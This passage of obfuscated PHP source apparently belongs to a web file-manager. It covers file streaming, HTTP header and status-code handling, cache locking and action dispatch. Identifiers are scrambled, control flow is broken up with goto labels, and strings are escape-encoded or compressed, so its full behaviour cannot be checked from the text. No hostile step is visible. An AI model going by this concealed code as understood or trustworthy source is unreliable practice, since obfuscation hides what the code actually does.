$this->info[$_SERVER[¦·][77]]; } public function stream_close() { return !0; } public function url_stat($DËäÒÛ‘Ò, $eä‘§”¥») { $d•×ãÍ×îˆ =& $_SERVER[¦·]; $dÛÆƒáç„‹ = $this->info($DËäÒÛ‘Ò); return array($d•×ãÍ×îˆ[1295] => 0, $d•×ãÍ×îˆ[1296] => 0, $d•×ãÍ×îˆ[12] => 32768 + 511, $d•×ãÍ×îˆ[1297] => 0, $d•×ãÍ×îˆ[1298] => 0, $d•×ãÍ×îˆ[1299] => 0, $d•×ãÍ×îˆ[1300] => 0, $d•×ãÍ×îˆ[77] => $dÛÆƒáç„‹[$d•×ãÍ×îˆ[77]], $d•×ãÍ×îˆ[1301] => $dÛÆƒáç„‹[$d•×ãÍ×îˆ[1172]], $d•×ãÍ×îˆ[1259] => $dÛÆƒáç„‹[$d•×ãÍ×îˆ[107]], $d•×ãÍ×îˆ[1258] => $dÛÆƒáç„‹[$d•×ãÍ×îˆ[187]], $d•×ãÍ×îˆ[1302] => 0, $d•×ãÍ×îˆ[1303] => 0); } static $fileInfo = array(); public function info($bŒõ„¯Ä©ñ) { $FÛÂ±ßñ¦İ = $_SERVER[¦·][1304]; if (isset(self::$fileInfo[$bŒõ„¯Ä©ñ])) { return self::$fileInfo[$bŒõ„¯Ä©ñ]; } if (substr($bŒõ„¯Ä©ñ, 0, strlen($FÛÂ±ßñ¦İ)) != $FÛÂ±ßñ¦İ) { return !1; } self::$fileInfo[$bŒõ„¯Ä©ñ] = IO::info(substr($bŒõ„¯Ä©ñ, strlen($FÛÂ±ßñ¦İ))); return self::$fileInfo[$bŒõ„¯Ä©ñ]; } public static function read($EŠÄİâÚ¹, $Dù§äÌ¼‡ç, $f½ÏºÃ“¿…) { goto e»‰áƒøŞ; e»‰áƒøŞ: $fïùÀù©Æ =& $_SERVER[¦·]; $cÅÙ¾ñ‚ŠÃ = fopen($EŠÄİâÚ¹, $fïùÀù©Æ[1174]); if (!$cÅÙ¾ñ‚ŠÃ) { return $fïùÀù©Æ[33]; } goto b†ùÕáİÜ; e³²¡Üâß³: $bøåºÖö‡ = 0; while ($bøåºÖö‡ < $f½ÏºÃ“¿…) { $c¾Ì•É²Ú = min($døÁ¢Ÿ†„, $f½ÏºÃ“¿… - $bøåºÖö‡); $cåŠÜ¸‰ .= fread($cÅÙ¾ñ‚ŠÃ, $c¾Ì•É²Ú); $bøåºÖö‡ += $c¾Ì•É²Ú; } fclose($cÅÙ¾ñ‚ŠÃ); goto Aá‡àÊôíì; b†ùÕáİÜ: $døÁ¢Ÿ†„ = 8192; fseek($cÅÙ¾ñ‚ŠÃ, $Dù§äÌ¼‡ç, SEEK_SET); $cåŠÜ¸‰ = $fïùÀù©Æ[33]; goto e³²¡Üâß³; Aá‡àÊôíì: return $cåŠÜ¸‰; goto Eµ»„¸²Ïí; Eµ»„¸²Ïí: } public function fileSubstr($b“Úƒ˜ŞÚ , $f¯ãˆØšŸ) { goto eù‘ù¥²“; b—œêŒ¿ƒ: if ($b“Úƒ˜ŞÚ  + $f¯ãˆØšŸ > $a£©«ª’) { $f¯ãˆØšŸ = $a£©«ª’ - $b“Úƒ˜ŞÚ ; } if ($f¯ãˆØšŸ <= 0) { return $b£¶§‚ÒÃÄ[33]; } if ($b“Úƒ˜ŞÚ  < 0 || $b“Úƒ˜ŞÚ  >= $a£©«ª’ || $f¯ãˆØšŸ <= 0 || $f¯ãˆØšŸ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\x69\x6c\145\x52\x65\x61\144\x20\145\162\x72\157\162\41\x20\x73\x74\141\x72\x74\x3d{$b“Úƒ˜ŞÚ }\73\x6c\145\156\147\x74\150\75{$f¯ãˆØšŸ}\x3b\40\163\151\x7a\x65\x3d{$a£©«ª’}\73"); } goto dØ¶Ú¥ª½Ü; EóÏ‘“„Ñ‘: ksort($eØ„ˆíÖ„„); $dÃùôº‘ = substr($a ‹™ğ°×, $b“Úƒ˜ŞÚ  - $cïó”İ‹ˆ, $f¯ãˆØšŸ); return $dÃùôº‘; goto cîæ‰‘èë¹; AÉ“„ã¨Âê: $cŒ¡‡² = ceil(($b“Úƒ˜ŞÚ  + $f¯ãˆØšŸ) / $f˜±ãâŠ¢) * $f˜±ãâŠ¢ - $cïó”İ‹ˆ; $a ‹™ğ°× = IO::fileSubstr($this->path, $cïó”İ‹ˆ, $cŒ¡‡²); $eØ„ˆíÖ„„[$cïó”İ‹ˆ . $b£¶§‚ÒÃÄ[33]] = $a ‹™ğ°×; goto EóÏ‘“„Ñ‘; aİ®Ö„±: $BÔÑó·ãË† = 0; $E¾«—„‡ŞÂ = 0; $dñ¾ó‰Â‡¥ = $b£¶§‚ÒÃÄ[33]; goto bŠÀÈ–µÎ; B•Ì¼¸ğÚù: $bùîŒÌ…²í = $f¯ãˆØšŸ; if ($b“Úƒ˜ŞÚ  < 0) { $b“Úƒ˜ŞÚ  = $a£©«ª’ + $b“Úƒ˜ŞÚ ; } if ($f¯ãˆØšŸ === !1) { $f¯ãˆØšŸ = $a£©«ª’ - $b“Úƒ˜ŞÚ ; } goto b—œêŒ¿ƒ; dØ¶Ú¥ª½Ü: $f˜±ãâŠ¢ = 64 * 1024; $eØ„ˆíÖ„„ =& self::$_chunkBuffer[$this->path]; if (!$eØ„ˆíÖ„„) { $eØ„ˆíÖ„„ = array(); } goto aİ®Ö„±; eù‘ù¥²“: $b£¶§‚ÒÃÄ =& $_SERVER[¦·]; $a£©«ª’ = $this->info[$b£¶§‚ÒÃÄ[77]]; $fâ¦¬×¿×Š = $b“Úƒ˜ŞÚ ; goto B•Ì¼¸ğÚù; bŠÀÈ–µÎ: foreach ($eØ„ˆíÖ„„ as $BÔÑó·ãË† => $dñ¾ó‰Â‡¥) { $BÔÑó·ãË† = intval($BÔÑó·ãË†); $E¾«—„‡ŞÂ = $BÔÑó·ãË† + strlen($dñ¾ó‰Â‡¥); if ($b“Úƒ˜ŞÚ  >= $E¾«—„‡ŞÂ) { continue; } if ($b“Úƒ˜ŞÚ  >= $BÔÑó·ãË† && $b“Úƒ˜ŞÚ  + $f¯ãˆØšŸ <= $E¾«—„‡ŞÂ) { return substr($dñ¾ó‰Â‡¥, $b“Úƒ˜ŞÚ  - $BÔÑó·ãË†, $f¯ãˆØšŸ); } break; } if (count($eØ„ˆíÖ„„) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($b£¶§‚ÒÃÄ[1305], $b£¶§‚ÒÃÄ[1306] . count($eØ„ˆíÖ„„) . "\73\x73\x74\141\162\x74\x3d{$b“Úƒ˜ŞÚ }\54\154\145\x6e\x67\x74\x68\x3d{$f¯ãˆØšŸ}\73\x70\x6f\163\145\x3a{$BÔÑó·ãË†}\x7e{$E¾«—„‡ŞÂ}"); throw new Exception($b£¶§‚ÒÃÄ[1307]); } $cïó”İ‹ˆ = intval($b“Úƒ˜ŞÚ  / $f˜±ãâŠ¢) * $f˜±ãâŠ¢; goto AÉ“„ã¨Âê; cîæ‰‘èë¹: } private function log($f÷ù’œÖ±, $Eƒç©ÑòÖ) { $BÚ‹Ô¢ì =& $_SERVER[¦·]; $d¢¬ùŒ‚Ÿ = timeFloat() - $this->timeStart; write_log(sprintf($BÚ‹Ô¢ì[1308], $f÷ù’œÖ±, $this->info[$BÚ‹Ô¢ì[28]], $d¢¬ùŒ‚Ÿ, $Eƒç©ÑòÖ), $BÚ‹Ô¢ì[1223]); } } class Message { function __construct() { } public function send($e‚â×ñŒ = '', $b˜ÙÉ£¼ìÍ = array(), $C¿óÈšÔ = "\164\145\x78\x74") { goto Bñ¡ÙâÀÃ; Bñ¡ÙâÀÃ: $f¸«İôÎŠÉ =& $_SERVER[¦·]; $A‹— éÆ«Ù = array($f¸«İôÎŠÉ[29] => $f¸«İôÎŠÉ[1309], $f¸«İôÎŠÉ[693] => $e‚â×ñŒ); if (in_array($C¿óÈšÔ, array($f¸«İôÎŠÉ[1309], $f¸«İôÎŠÉ[1310]))) { $A‹— éÆ«Ù[$f¸«İôÎŠÉ[29]] = $C¿óÈšÔ; } goto e‹ƒ«éµŠï; e‹ƒ«éµŠï: $b˜ÙÉ£¼ìÍ = array($f¸«İôÎŠÉ[973] => isset($b˜ÙÉ£¼ìÍ[$f¸«İôÎŠÉ[973]]) ? $b˜ÙÉ£¼ìÍ[$f¸«İôÎŠÉ[973]] : $f¸«İôÎŠÉ[33], $f¸«İôÎŠÉ[536] => isset($b˜ÙÉ£¼ìÍ[$f¸«İôÎŠÉ[536]]) ? $b˜ÙÉ£¼ìÍ[$f¸«İôÎŠÉ[536]] : $f¸«İôÎŠÉ[33]); if (empty($e‚â×ñŒ) || empty($b˜ÙÉ£¼ìÍ[$f¸«İôÎŠÉ[973]]) && empty($b˜ÙÉ£¼ìÍ[$f¸«İôÎŠÉ[536]])) { return !1; } $C­ùš¨°ÂÉ = array($f¸«İôÎŠÉ[1251] => $A‹— éÆ«Ù, $f¸«İôÎŠÉ[1311] => $b˜ÙÉ£¼ìÍ); goto cããœØùî; cããœØùî: Hook::trigger($f¸«İôÎŠÉ[1312], $C­ùš¨°ÂÉ); goto a¹÷”Æ¬æ‚; a¹÷”Æ¬æ‚: } } goto FÅ¯±íùĞ¤; FºÛÑî³: define($_SERVER[¦·][1943], 5); define($_SERVER[¦·][1944], 16); define($_SERVER[¦·][1945], 32); goto cƒ§‰²¨ñë; bãÈöÓ¾•Ù: function beforeShutdownFatalError($f–“ËÑİªğ) { think_exception($f–“ËÑİªğ); } $_SERVER[$_SERVER[æªÊ«][45]] = $b Î«ÅâÑ($_SERVER[$_SERVER[æªÊ«][42]]); $E¥ˆ±ÓÙ¡Æ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto fé¤çÖå­Ş; cøŠ·à¸»ø: class HttpHeader { public static $_headers = array("\x48\x6f\163\x74" => "\110\124\124\x50\x5f\x48\117\x53\124", "\x55\163\145\162\55\x41\147\x65\156\164" => "\x48\x54\124\120\137\125\123\x45\122\137\101\x47\x45\x4e\x54", "\x43\x6f\156\164\145\156\x74\x2d\124\171\160\x65" => "\110\x54\124\x50\x5f\103\117\116\124\105\x4e\124\137\124\131\x50\x45", "\x43\x6f\156\x74\x65\x6e\164\x2d\114\145\x6e\147\x74\150" => "\110\124\124\x50\x5f\103\117\116\x54\105\116\124\137\114\x45\x4e\107\124\x48", "\x44\145\160\x74\150" => "\110\124\x54\x50\x5f\x44\x45\x50\124\x48", "\105\x78\x70\x65\x63\164" => "\x48\x54\124\120\137\x45\x58\x50\105\103\x54", "\x49\x66\55\116\157\x6e\x65\55\x4d\141\x74\x63\150" => "\110\124\x54\x50\137\x49\x46\137\x4e\117\x4e\105\x5f\x4d\101\124\x43\x48", "\111\146\x2d\x4d\141\164\143\150" => "\110\x54\124\x50\137\111\106\x5f\x4d\x41\124\103\110", "\111\x66\55\122\141\x6e\147\145" => "\110\124\x54\x50\x5f\111\106\137\x52\101\x4e\107\105", "\x4c\x61\x73\x74\55\115\157\x64\x69\146\151\145\x64" => "\x48\124\x54\120\137\x4c\x41\123\x54\137\x4d\x4f\104\x49\106\111\x45\104", "\111\146\55\x4d\157\144\151\x66\x69\145\x64\x2d\x53\x69\156\x63\x65" => "\110\x54\x54\x50\137\111\x46\137\x4d\117\x44\x49\x46\111\105\104\137\x53\x49\116\x43\105", "\x49\146\x2d\x55\x6e\155\157\x64\151\x66\x69\x65\x64\55\x53\x69\156\x63\145" => "\110\x54\x54\120\x5f\x49\106\137\125\116\115\x4f\x44\x49\106\x49\105\x44\x5f\123\x49\x4e\103\105", "\122\x61\x6e\147\145" => "\x48\124\x54\x50\x5f\122\101\116\107\x45", "\x54\x69\155\145\157\x75\x74" => "\x48\x54\x54\x50\137\124\111\x4d\105\117\x55\x54", "\111\146" => "\x48\x54\124\x50\x5f\x49\x46", "\x4c\157\x63\153\x2d\124\157\153\145\x6e" => "\x48\x54\x54\120\x5f\114\x4f\x43\x4b\x5f\x54\x4f\x4b\105\x4e", "\117\x76\145\x72\167\x72\x69\x74\x65" => "\110\124\124\120\x5f\117\126\x45\122\127\122\111\124\105", "\x44\x65\x73\164\x69\x6e\141\164\151\x6f\x6e" => "\x48\124\x54\x50\137\x44\x45\x53\124\111\x4e\x41\124\x49\x4f\116", "\122\x65\x71\165\x65\x73\x74\55\111\x64" => "\122\x45\121\x55\105\x53\124\x5f\111\x44", "\x52\145\161\x75\x65\163\164\55\x42\x6f\x64\171\55\x46\x69\154\145" => "\x52\105\121\x55\x45\123\x54\137\x42\117\104\131\137\106\111\x4c\105", "\122\x65\144\151\162\145\x63\164\55\123\164\x61\164\165\163" => "\122\105\x44\x49\122\x45\x43\124\x5f\x53\124\101\124\x55\x53"); public static function init() { static $CŸÇÖÄæ†Ã = false; if ($CŸÇÖÄæ†Ã) { return; } foreach ($_SERVER as $eÔ¦á»„šö => $a¤éé‚«Š) { $eÔ¦á»„šö = strtoupper($eÔ¦á»„šö); if (!array_key_exists($eÔ¦á»„šö, $_SERVER)) { continue; } $_SERVER[$eÔ¦á»„šö] = $a¤éé‚«Š; } foreach (self::$_headers as $eÔ¦á»„šö => $e¯‡ôÈ¥Ôì) { if (!array_key_exists($eÔ¦á»„šö, $_SERVER)) { continue; } $_SERVER[$eÔ¦á»„šö] = $_SERVER[$e¯‡ôÈ¥Ôì]; $_SERVER[strtoupper($eÔ¦á»„šö)] = $_SERVER[$e¯‡ôÈ¥Ôì]; } } public static function get($DãÛéÕ¨ºœ) { self::init(); return $_SERVER[$DãÛéÕ¨ºœ] ? $_SERVER[$DãÛéÕ¨ºœ] : $_SERVER[$_SERVER[¦·][1834] . strtoupper($DãÛéÕ¨ºœ)]; } public static function method() { return strtoupper(self::get($_SERVER[¦·][154])); } public static function length() { $D§ÂåãöÚš =& $_SERVER[¦·]; $AåÑÁëÉÍ¤ = self::get($D§ÂåãöÚš[1835]); if (!$AåÑÁëÉÍ¤) { $AåÑÁëÉÍ¤ = self::get($D§ÂåãöÚš[1151]); } return $AåÑÁëÉÍ¤; } public static function range() { $eƒÅ™øÎ =& $_SERVER[¦·]; $e¦î„ÛÜÚÊ = self::get($eƒÅ™øÎ[198]); if (!$e¦î„ÛÜÚÊ) { return !1; } if (!preg_match($eƒÅ™øÎ[1836], $e¦î„ÛÜÚÊ, $eÅ²ŠòÈùˆ)) { return !1; } if ($eÅ²ŠòÈùˆ[1] === $eƒÅ™øÎ[33] && $eÅ²ŠòÈùˆ[2] === $eƒÅ™øÎ[33]) { return !1; } return array($eÅ²ŠòÈùˆ[1] !== $eƒÅ™øÎ[33] ? $eÅ²ŠòÈùˆ[1] : null, $eÅ²ŠòÈùˆ[2] !== $eƒÅ™øÎ[33] ? $eÅ²ŠòÈùˆ[2] : null); } public static $statusCode = array("\61\x30\x30" => "\x43\157\x6e\164\151\x6e\x75\145", "\61\x30\x31" => "\x53\x77\x69\x74\x63\x68\151\156\147\40\120\162\x6f\x74\x6f\x63\x6f\x6c", "\x31\x30\x32" => "\120\x72\x6f\143\x65\163\163\x69\156\147", "\x31\60\63" => "\105\141\162\x6c\171\x20\x48\151\x6e\164\163", "\x32\60\x30" => "\117\113", "\x32\60\61" => "\x43\x72\145\x61\164\x65\x64", "\x32\60\62" => "\x41\143\143\145\160\164\145\x64", "\62\60\63" => "\116\157\156\55\x41\165\164\x68\157\162\151\x74\141\164\x69\166\145\40\x49\x6e\x66\x6f\162\x6d\x61\x74\x69\x6f\x6e", "\62\60\x34" => "\x4e\x6f\x20\103\x6f\156\x74\x65\x6e\164", "\x32\60\65" => "\x52\x65\x73\x65\164\x20\x43\x6f\156\x74\x65\x6e\164", "\x32\60\x36" => "\x50\141\162\164\x69\x61\x6c\x20\103\x6f\156\x74\145\156\164", "\x32\x30\67" => "\115\x75\154\164\x69\55\x53\x74\141\164\165\x73", "\x33\60\60" => "\x4d\165\x6c\x74\x69\x70\154\x65\x20\103\150\x6f\151\143\x65\163", "\x33\60\61" => "\115\157\166\x65\x64\40\120\x65\162\155\141\x6e\145\x6e\x74\154\x79", "\x33\60\x32" => "\106\x6f\x75\156\x64", "\63\x30\63" => "\x53\145\145\x20\x4f\164\x68\x65\162", "\x33\60\64" => "\116\157\164\x20\115\x6f\x64\151\x66\x69\145\x64", "\63\60\65" => "\x55\163\x65\x20\120\162\x6f\x78\x79", "\x33\60\67" => "\124\145\155\x70\157\x72\x61\x72\x79\x20\122\145\x64\151\x72\x65\143\164", "\63\x30\x38" => "\x50\x65\x72\x6d\141\156\x65\156\x74\40\122\x65\x64\151\162\x65\x63\x74", "\x34\x30\x30" => "\x42\141\x64\40\x52\x65\161\x75\x65\163\164", "\64\x30\61" => "\x55\156\x61\165\164\150\x6f\162\x69\x7a\x65\144", "\x34\60\62" => "\x50\141\171\x6d\145\x6e\164\x20\122\x65\x71\x75\x69\x72\145\144", "\64\60\x33" => "\106\157\162\x62\x69\x64\x64\x65\156", "\x34\60\x34" => "\x4e\157\x74\40\106\157\x75\x6e\144", "\64\60\x35" => "\115\x65\164\x68\x6f\x64\x20\x4e\157\x74\x20\x41\x6c\x6c\x6f\x77\145\144", "\64\x30\x36" => "\x4e\157\x74\40\101\143\x63\x65\160\x74\141\142\x6c\145", "\x34\x30\67" => "\120\162\157\170\171\40\x41\x75\164\x68\x65\x6e\164\x69\x63\x61\x74\151\x6f\156\x20\x52\145\161\165\151\162\145\x64", "\64\60\x38" => "\x52\145\161\x75\145\163\164\x20\x54\151\155\x65\157\165\x74", "\64\60\71" => "\x43\157\x6e\146\154\151\143\164", "\64\61\60" => "\107\157\156\145", "\x34\61\61" => "\114\145\156\147\164\150\x20\122\145\x71\x75\151\162\x65\144", "\x34\61\x32" => "\x50\162\145\x63\157\156\144\151\164\x69\157\x6e\x20\106\x61\151\154\x65\144", "\64\x31\63" => "\122\x65\161\x75\x65\x73\164\x20\105\156\x74\x69\164\x79\40\x54\157\157\x20\114\141\162\147\145", "\64\x31\64" => "\x52\x65\161\165\x65\x73\164\x20\x55\x52\111\x20\x54\x6f\x6f\x20\x4c\x61\162\x67\145", "\64\61\65" => "\x55\x6e\x73\x75\x70\x70\x6f\x72\x74\145\144\x20\115\x65\144\151\x61\x20\124\x79\160\145", "\x34\x31\66" => "\x52\x65\x71\x75\145\x73\164\x65\144\x20\122\141\156\147\x65\x20\x4e\x6f\164\40\123\141\164\x69\x73\146\x69\141\x62\x6c\x65", "\64\x31\x37" => "\x45\170\x70\145\143\164\141\164\x69\x6f\156\x20\106\x61\x69\x6c\x65\144", "\64\62\x32" => "\x55\x6e\x70\162\157\x63\x65\x73\163\x61\142\154\145\x20\105\156\164\x69\x74\171", "\64\x32\63" => "\x4c\x6f\143\153\x65\144", "\64\x32\64" => "\x46\x61\151\154\x65\144\x20\x44\145\160\x65\156\x64\145\x6e\143\x79", "\x34\x32\x35" => "\x55\156\x6f\162\x64\x65\x72\x65\144\40\103\157\x6c\154\145\x63\164\151\157\x6e", "\64\x32\x36" => "\x55\160\147\162\x61\x64\145\x20\x52\145\161\165\151\162\x65\144", "\x34\62\70" => "\x50\x72\x65\143\157\156\144\x69\164\151\157\156\40\x52\145\x71\x75\x69\162\x65\x64", "\64\62\x39" => "\124\x6f\x6f\40\115\x61\156\171\x20\122\145\x71\165\145\163\164\163", "\x34\63\x31" => "\x52\x65\x71\x75\x65\x73\164\x20\x48\145\x61\x64\x65\162\x20\106\151\x65\x6c\x64\x73\40\x54\x6f\x6f\x20\x4c\x61\162\x67\145", "\64\x34\x34" => "\x4e\157\x20\x52\x65\x73\160\x6f\156\x73\145", "\x34\65\60" => "\102\154\x6f\x63\x6b\x65\144\x20\142\x79\40\127\151\156\x64\x6f\x77\x73\40\x50\141\162\145\x6e\164\x61\154\40\x43\x6f\156\x74\162\157\154\x73", "\64\65\61" => "\125\156\x61\166\141\x69\154\x61\142\x6c\x65\x20\x46\x6f\x72\x20\114\x65\x67\141\154\40\122\x65\x61\163\x6f\156\163", "\64\71\64" => "\122\x65\161\165\x65\x73\x74\x20\110\x65\141\x64\145\162\x20\x54\157\157\x20\x4c\x61\x72\x67\x65", "\65\x30\60" => "\x49\x6e\x74\x65\162\156\141\x6c\40\123\x65\162\x76\x65\162\x20\x45\162\x72\x6f\x72", "\65\60\x31" => "\116\x6f\x74\x20\111\155\x70\154\x65\155\x65\156\164\145\x64", "\65\x30\x32" => "\x42\x61\x64\40\x47\x61\164\x65\x77\141\x79", "\x35\60\63" => "\x53\145\x72\166\x69\143\145\x20\125\x6e\141\x76\x61\151\x6c\141\x62\x6c\145", "\x35\60\x34" => "\x47\141\x74\145\167\141\x79\40\124\x69\x6d\x65\x6f\165\164", "\x35\60\x35" => "\110\x54\124\x50\40\x56\145\162\x73\151\x6f\x6e\40\156\157\164\x20\x73\165\x70\160\x6f\162\164\x65\x64", "\65\60\x37" => "\x49\156\x73\x75\x66\146\151\x63\151\x65\156\164\40\x53\x74\x6f\162\x61\147\145"); public static function code($fğİ³š÷æ) { $bÊƒ¼Ú™ =& $_SERVER[¦·]; $fğİ³š÷æ = $fğİ³š÷æ . $bÊƒ¼Ú™[33]; $díß‰ÆŞ¦õ = self::$statusCode[$fğİ³š÷æ]; $díß‰ÆŞ¦õ = $díß‰ÆŞ¦õ ? "\x48\124\124\x50\57\x31\56\x31\x20{$fğİ³š÷æ}\40" . $díß‰ÆŞ¦õ : $bÊƒ¼Ú™[33]; return $díß‰ÆŞ¦õ; } } $c›¥±²Ù¯” = LIB_DIR . $_SERVER[¦·][1120]; $eÅ‹œ‘½§ = $_SERVER[¦·][790]; goto e¤Š—Ğ¬¥; AÑÅØß¾³‘: class CacheLockRedis { public function lock($fµ‘›‡Çğ, $F¢Ç™Úµˆ× = 10) { $fö¤Í„ô… = Cache::init(); $d³¹—ˆÛˆæ = microtime(!0) + $F¢Ç™Úµˆ×; while (microtime(!0) < $d³¹—ˆÛˆæ) { $FîË®¯ØÃ« = $fö¤Í„ô…->get($fµ‘›‡Çğ); if (!$FîË®¯ØÃ«) { $C¦ãÁ¼æÄ˜ = $fö¤Í„ô…->setLock($fµ‘›‡Çğ, $d³¹—ˆÛˆæ, $F¢Ç™Úµˆ×); if ($C¦ãÁ¼æÄ˜) { return !0; } } else { if ($FîË®¯ØÃ« < microtime(!0)) { $fö¤Í„ô…->set($fµ‘›‡Çğ, $d³¹—ˆÛˆæ, $d³¹—ˆÛˆæ); if ($fö¤Í„ô…->get($fµ‘›‡Çğ) === $FîË®¯ØÃ«) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($eÚæ¦¡áâÆ) { return Cache::init()->get($eÚæ¦¡áâÆ); } public function unlock($A‘“Şä´‹) { return Cache::init()->remove($A‘“Şä´‹); } } class CacheLockMemcached { public function lock($Aà†¯¸ì£, $a²Ö­èó– = 0) { $F¾“Ö°óª = Cache::init(); $E½µÈÜÕ = microtime(!0) + $a²Ö­èó–; while (microtime(!0) < $E½µÈÜÕ) { $AºÁÀùï¢é = $F¾“Ö°óª->get($Aà†¯¸ì£); if (!$AºÁÀùï¢é || $AºÁÀùï¢é < microtime(!0)) { $F—ìì®™ïÓ = $F¾“Ö°óª->handle->add($Aà†¯¸ì£, $E½µÈÜÕ, $a²Ö­èó–); if ($F—ìì®™ïÓ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($bİêÁÇ¸Ñ¼) { return Cache::init()->get($bİêÁÇ¸Ñ¼); } public function unlock($AĞäòÎÒÂ) { return Cache::init()->remove($AĞäòÎÒÂ); } } class CacheLockDatabase { public function lock($dçƒš×™ì©, $B‰’ªå¼’¸ = 0) { $EÒİ›–…±Œ = Model($_SERVER[¦·][757]); $aŒ™àŠ¿Ñ = microtime(!0) + $B‰’ªå¼’¸; while (microtime(!0) < $aŒ™àŠ¿Ñ) { $cÑù¥¾È­  = $EÒİ›–…±Œ->get($dçƒš×™ì©); if (!$cÑù¥¾È­  || $cÑù¥¾È­  < microtime(!0)) { $bÃ†™Íœ‘ = $EÒİ›–…±Œ->set($dçƒš×™ì©, $aŒ™àŠ¿Ñ); if ($bÃ†™Íœ‘) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($D±¶ç„ÜÓ) { return Model($_SERVER[¦·][757])->get($D±¶ç„ÜÓ); } public function unlock($Bô¸±ß¤ä„) { Model($_SERVER[¦·][757])->remove($Bô¸±ß¤ä„); } } goto D„§Î¡…¨ñ; e¨ÇÕ¬‹ˆ¿: $eÜèÚÜˆõ² = $_SERVER[¦·][548]; if (!$eÜèÚÜˆõ²) { die; } $_SERVER[Ó¥ú] = explode($_SERVER[¦·][549], gzinflate(substr($_SERVER[¦·][550], 10, -8))); goto f±öã¹êˆ; cÙÁº­’: function Action($BÖÜ›â®˜º = '') { goto EÌÊ¬¢¡ê¢; dò­…‹Ãôª: $Fİ¡ĞİÅí· = strtolower($Dµ‰Øé[0]); if (substr($Fİ¡ĞİÅí·, -6) == $Bîäº­®¹È[6]) { $BÖÜ›â®˜º = substr($Dµ‰Øé[0], 0, -6); $CÁ‚Ó§±Ôß = $BÖÜ›â®˜º . $Bîäº­®¹È[7]; $F³ ‹¬ì° = $Bîäº­®¹È[8]; if (isset($Dµ‰Øé[1]) && substr(strtolower($Dµ‰Øé[1]), -5) == $Bîäº­®¹È[9]) { $CÁ‚Ó§±Ôß = $BÖÜ›â®˜º . $Dµ‰Øé[1]; $F³ ‹¬ì° = $Bîäº­®¹È[10] . $Dµ‰Øé[1] . $Bîäº­®¹È[11]; } else { if (count($Dµ‰Øé) == 3) { $CÁ‚Ó§±Ôß = $BÖÜ›â®˜º . $Dµ‰Øé[1] . $Dµ‰Øé[2]; $F³ ‹¬ì° = $Bîäº­®¹È[12] . $Dµ‰Øé[1] . $Bîäº­®¹È[13] . $Dµ‰Øé[2] . $Bîäº­®¹È[11]; } } $F³ ‹¬ì° = PLUGIN_DIR . $BÖÜ›â®˜º . $Bîäº­®¹È[4] . $F³ ‹¬ì°; } else { if (substr($Fİ¡ĞİÅí·, -5) == $Bîäº­®¹È[9]) { $BÖÜ›â®˜º = substr($Dµ‰Øé[0], 0, -5); return Model($BÖÜ›â®˜º); } else { $CÁ‚Ó§±Ôß = $Dµ‰Øé[0] . $Dµ‰Øé[1]; $F³ ‹¬ì° = CONTROLLER_DIR . $Dµ‰Øé[0] . $Bîäº­®¹È[4] . $Dµ‰Øé[1] . $Bîäº­®¹È[14]; } } $B×„™—º¨× = strtolower($CÁ‚Ó§±Ôß); goto c‰çÈæ¬¶; c‰çÈæ¬¶: if (isset($F´‚±…—è[$B×„™—º¨×])) { return $F´‚±…—è[$B×„™—º¨×]; } if (is_file($F³ ‹¬ì°)) { include_once $F³ ‹¬ì°; } if (!class_exists($CÁ‚Ó§±Ôß)) { return actionCallError("\x5b{$BÖÜ›â®˜º}\x20\75\76\40{$CÁ‚Ó§±Ôß}\135\40\143\154\141\x73\163\x20\156\x6f\x74\40\145\x78\151\163\164\x73\41"); } goto A“…÷èí„ì; EÌÊ¬¢¡ê¢: $Bîäº­®¹È =& $_SERVER[æªÊ«]; static $F´‚±…—è = array(); $Dˆ‘âœÜÔ = $BÖÜ›â®˜º; goto AÚÆ–ïÃ—; AÚÆ–ïÃ—: if (isset($F´‚±…—è[$Dˆ‘âœÜÔ])) { return $F´‚±…—è[$Dˆ‘âœÜÔ]; } $BÖÜ›â®˜º = trim(str_replace($Bîäº­®¹È[4], $Bîäº­®¹È[5], $BÖÜ›â®˜º), $Bîäº­®¹È[4]); $Dµ‰Øé = explode($Bîäº­®¹È[5], $BÖÜ›â®˜º); goto dò­…‹Ãôª; A“…÷èí„ì: $F´‚±…—è[$B×„™—º¨×] = new $CÁ‚Ó§±Ôß(); $F´‚±…—è[$Dˆ‘âœÜÔ] = $F´‚±…—è[$B×„™—º¨×]; return $F´‚±…—è[$B×„™—º¨×]; goto Cè´ËçÔ‚Û; Cè´ËçÔ‚Û: } function ActionApply($A„áô¹·Ú«, $CÂ¥¦—¾İ‡ = array()) { goto c»É˜³œ±Û; c»É˜³œ±Û: if (is_array($A„áô¹·Ú«)) { return call_user_func_array($A„áô¹·Ú«, $CÂ¥¦—¾İ‡); } if (function_exists($A„áô¹·Ú«)) { return call_user_func_array($A„áô¹·Ú«, $CÂ¥¦—¾İ‡); } $BÈÒê¾„áÙ = strrpos($A„áô¹·Ú«, $_SERVER[æªÊ«][5]); goto C„«ôã·¯; C„«ôã·¯: $Cóæ¯ÛÒÂ¨ = substr($A„áô¹·Ú«, 0, $BÈÒê¾„áÙ); $bœ‚ã½›ÀŸ = substr($A„áô¹·Ú«, $BÈÒê¾„áÙ + 1); $có¬íòà› = Action($Cóæ¯ÛÒÂ¨); goto Càçô½”Êƒ; Càçô½”Êƒ: if (!method_exists($có¬íòà›, $bœ‚ã½›ÀŸ)) { return actionCallError("{$A„áô¹·Ú«}\x20\x6d\x65\x74\x68\x6f\x64\x20\x6e\157\164\x20\145\x78\151\x73\164\163\41"); } $a•ÇÈ½Úç® = call_user_func_array(array($có¬íòà›, $bœ‚ã½›ÀŸ), $CÂ¥¦—¾İ‡); return $a•ÇÈ½Úç®; goto eøõóàòŸÇ; eøõóàòŸÇ: } function actionCallError($Cîš‹ä¤™Ú) { return write_log($Cîš‹ä¤™Ú, $_SERVER[æªÊ«][15]); } goto b—¿Û…Æ‰; BÁ”ÖÄ®‹¸: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($D ±ç¬ÇÓ¶) { goto E±…¶ÉÍÅ—; E±…¶ÉÍÅ—: $AËñÜ”ÖÆ =& $_SERVER[¦·]; $fÀä×‘Ñ·± = KodIO::fileTypeList(); $e†‹®Åìè— = $fÀä×‘Ñ·±[$D ±ç¬ÇÓ¶]; goto CÀÈŒ‚ì›ß; 